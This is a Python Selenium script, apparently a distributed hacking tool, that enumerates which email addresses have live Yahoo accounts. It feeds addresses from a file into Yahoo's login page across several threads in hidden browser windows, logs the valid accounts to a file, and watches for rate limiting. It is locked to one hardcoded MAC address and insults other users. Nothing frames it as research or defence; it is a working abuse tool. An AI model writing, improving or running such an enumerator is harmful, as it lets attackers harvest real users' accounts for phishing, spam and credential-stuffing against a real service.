from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import os
import glob
import threading
import colorama
from colorama import Fore
from getmac import get_mac_address as gma
colorama.init(autoreset=True)
import time
timer = 2
mac = gma()
print (mac)

macs = ["d0:50:99:f9:fb:48"]
if mac in macs:

    path = "chromedriver.exe"
    url = "https://login.yahoo.com/account/challenge/session-expired?.intl=xa&intl=xa&.lang=ar-JO&src=ym&specId=yidreg&activity=header-signup&pspid=1197806870&done=https%3A%2F%2Fmail.yahoo.com%2Fd%3F.intl%3Dxa%26.lang%3Dar-JO%26.partner%3Dnone%26.src%3Dfp%26activity%3Duh-mail&authMechanism=secondary&acrumb=enokhtR8&lang=ar-JO"

    threads_number = int(input("how many threads do u want : "))




    with open("emails.txt") as f:
        emails = [line.rstrip() for line in f]
        emails_count=(len(emails))
        emails_count = int(emails_count/threads_number)

    def cheack_rate_limte(email , all):
        if "rate limited" in all:
            print(f"{email} rate limted")
            exit()

    def check_email(emails,emails_count):

        for _ in range (emails_count):
            email=emails[0]
            del emails[0]
            options = webdriver.ChromeOptions()
            options.add_experimental_option('excludeSwitches', ['enable-logging'])
            driver = webdriver.Chrome(executable_path=path, options=options)
            driver.set_window_position(-10000, 0)

            driver.get(url)
            all = (driver.page_source)
            cheack_rate_limte(email,all)
            start_over = driver.find_element_by_link_text("بدء من جديد")
            start_over.click()

            email_search = driver.find_element_by_name("username")
            email_search.send_keys(email)
            email_search.send_keys(Keys.ENTER)
            try:
                cheack_rate_limte(email,all)

                email_search = driver.find_element_by_name("username")
                print(f"{Fore.RED}{email} is dead")
            except:
                cheack_rate_limte(email,all)

                with open(
                    "live emails.txt",
                    "a+",
                ) as file:
                    file.write(email)
                    file.write("\n")
                print(f"{Fore.YELLOW}{email} is live")

            time.sleep(timer)
            driver.quit()


    threads = []
    for i in range(threads_number):

        thread1 = threading.Thread(target=check_email, args=(emails,emails_count))
        thread1.start()
        threads.append(thread1)

    for thread2 in threads:
        thread2.join
else:
    print("your mac isn't known for us , bitch")
